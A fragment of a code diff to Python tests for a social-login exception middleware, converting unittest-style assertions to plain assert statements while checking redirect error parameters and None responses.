+        assert response.status_code == status.HTTP_302_FOUND
+        assert "error_code=social_login_failure" in response.url
+        assert "error_detail=" in response.url
 
         parsed = urlparse(response.url)
         error_detail = parse_qs(parsed.query).get("error_detail", [""])[0]
         if isinstance(exception, AuthFailed):
-            self.assertFalse(error_detail.startswith("Authentication failed: "))
+            assert not error_detail.startswith("Authentication failed: ")
 
     @parameterized.expand(
         [
@@ -1885,7 +1873,7 @@ class TestSocialAuthExceptionMiddleware(APIBaseTest):
         request = self.factory.get(path)
         response = self.middleware.process_exception(request, exception)
 
-        self.assertIsNone(response)
+        assert response is None
 
 
 @pytest.mark.parametrize(
